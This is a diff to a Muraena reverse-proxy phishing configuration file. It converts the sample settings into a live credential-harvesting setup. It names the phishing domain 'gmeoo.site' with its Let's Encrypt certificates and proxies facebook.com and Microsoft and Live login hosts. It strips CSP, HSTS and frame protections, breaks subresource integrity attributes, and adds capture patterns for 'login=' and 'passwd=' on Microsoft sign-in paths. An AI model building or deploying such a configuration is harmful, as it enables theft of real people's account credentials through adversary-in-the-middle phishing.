@@ -6,23 +6,19 @@
 #
 [proxy]
     # Phishing domain
-    phishing = "phishing.click"
+    phishing = "gmeoo.site"
 
     # Target domain to proxy
-    destination = "example.com"
+    destination = "facebook.com"
 
-    # Listening IP address (IPv4 or IPv6)
-	# e.g. 0.0.0.0 or [::]
-    # Default 0.0.0.0
-    #IP = "127.0.0.1"
+    # Listen on all interfaces
+    IP = "0.0.0.0"
 
-    # Listeninng TCP Port
-    # Default 443 for HTTPS, 80 for HTTP
-    #port = 443
+    # Use 443 for HTTPS
+    port = 443
 
-	# Listen announces on the local network address.
-	# The network must be "tcp", "tcp4", "tcp6" (default "tcp").
-	# listener = "tcp4"
+    # Use TCP4 for listener
+    listener = "tcp4"
 
     #
     # Simple port forwarding used when the phishing site listen on a port different from target domain, such as:
@@ -31,22 +27,21 @@
     #
     # port mapping can be configured as follows:
     # <ListeningPort>:<TargetPort>
-    #portmapping = "443:31337"
+    # portmapping = "1337:443"
 
     # Force HTTP to HTTPS redirection
     [proxy.HTTPtoHTTPS]
     enable = true
-    HTTPport = 80
+    port = 80
 
 
 #
 # Origins
 # See: https://muraena.phishing.click/docs/origins
 #
-#[origins]
-# externalOriginPrefix = "cdn-"
-# externalOrigins = [ ]
-
+[origins]
+externalOriginPrefix = "ext-"
+externalOrigins = ["github.com", "login.microsoft.com","account.live.com", "login.live.com", "microsoft.com", "office.com", "outlook.com", "windows.net", "windows.com", "microsoftonline.com", "microsoftonline-p.com"]
 
 #
 # Transform
@@ -71,38 +66,42 @@
 #        ]
 
     [transform.response]
-        skipContentType = [ "font/*", "image/*" ]
+        skipContentType = ["image/jpeg", "font/*", "application/*"]
 
-#        headers = [
-#            "Location",
-#            "WWW-Authenticate",
-#            "Origin",
-#            "Set-Cookie",
-#            "Access-Control-Allow-Origin",
-#        ]
-#        customContent = [
-#            ["this is green","this is blue"],
-#        ]
+       headers = [
+                "Location",
+                "Origin",
+                "Set-Cookie",
+                "Access-Control-Allow-Origin",
+                ]
+       customContent = [
+                ["integrity=", "integrify="]
+                ]
 #
-#        remove.headers = [
-#            "X-XSS-Protection",
-#        ]
-#        add.headers = [
-#            {name = "X-Phishing", value = "via Muraena"},
-#        ]
+       remove.headers = [
+                "Content-Security-Policy",
+                "Content-Security-Policy-Report-Only",
+                "Report-To",
+                "X-Content-Type-Options",
+                "X-Frame-Options",
+                "Referrer-Policy",
+                "Strict-Transport-Security",
+                "X-XSS-Protection",
+                    ]
+       add.headers = [
+           {name = "X-Phishing", value = "via Muraena"},
+                    ]
 
 
 #
 # Redirect
 # See: https://muraena.phishing.click/docs/redirect
 #
-#[redirect]
-#    [[redirect]]
-#        hostname = "phishing.click"
-#        path = "/login"
-#        query = "id=123"
-#        redirectTo = "https://poor.victim/login"
-#        httpStatusCode = 301
+    [[redirect]]
+        hostname = "phishing.click"
+       path = "/buyer/reset"
+       redirectTo = "https://phishing.click/evilpath/static"
+       httpStatusCode = 301
 
 
 #
@@ -129,35 +128,22 @@
 # See: https://muraena.phishing.click/docs/tls
 #
 [tls]
-    enable =true
-
-    # Expand allows to replace the content of the certificate/key/root parameters to their content instead of the
-    # filepath
+    enable = true
     expand = false
-    certificate = "./config/cert.pem"
-    key = "./config/privkey.pem"
-    root = "./config/fullchain.pem"
-    sslKeyLog = "./config/sslkeylog.log"
+    certificate = "/etc/letsencrypt/live/gmeoo.site/fullchain.pem"
+    key = "/etc/letsencrypt/live/gmeoo.site/privkey.pem"
+    root = "/etc/letsencrypt/live/gmeoo.site/chain.pem"
+    minVersion = "TLS1.2"
+    insecureSkipVerify = true
+    sessionTicketsDisabled = true
+    renegotiationSupport = "Never"
 
 	#
 	# Danger zone, be careful editing these settings
 	#
 	# Minimum supported TLS version: SSL3.0, TLS1.0, TLS1.1, TLS1.2, TLS1.3
-	minVersion = "TLS1.2"
 #    maxVersion = "TLS1.3"
 #	preferServerCipherSuites = true
-#	sessionTicketsDisabled =  true
-	# InsecureSkipVerify controls whether muraena verifies the server's
-	# certificate chain and host name.
-#	insecureSkipVerify = false
-
-	# RenegotiationSupport
-	# Note: renegotiation is not defined in TLS 1.3.
-	# Options:
-	# - Never (default):disables renegotiation
-	# - Once:			allows a remote server to request renegotiation once per connection.
-	# - Freely:			allows a remote server to repeatedly request renegotiation.
-	renegotiationSupport = "Never"
 
 
 
@@ -170,7 +156,7 @@
 # See: https://muraena.phishing.click/modules/tracker
 #
 [tracking]
-    enable =false
+    enable =true
     trackRequestCookie = true
 
     [tracking.trace]
@@ -200,12 +186,17 @@
             # redirectTo = "https://www.google.com"
 
 [tracking.secrets]
-        paths = ["/login", "/submit"]
+        paths = ["/login", "/submit", "/user/ajaxsignin", "/ppsecure/post.srf"]
 
         [[tracking.secrets.patterns]]
         label = "Credential Capture - Username"
-        start = "username="
+        start = "login="
         end = "&"
+
+        [[tracking.secrets.patterns]]
+        label = "Credential Capture - Password"
+        start = "passwd="
+        end = ""
 
 
 
@@ -232,10 +223,10 @@
 # Static Server
 # See: https://muraena.phishing.click/modules/staticserver
 #
-#[staticServer]
-#    enable =false
-#    localPath = "./static/"
-#    urlPath = "/evilpath/"
+[staticServer]
+   enable = true
+   localPath = "./static/"
+   urlPath = "/evilpath/static"
 
 #
 # Watchdog
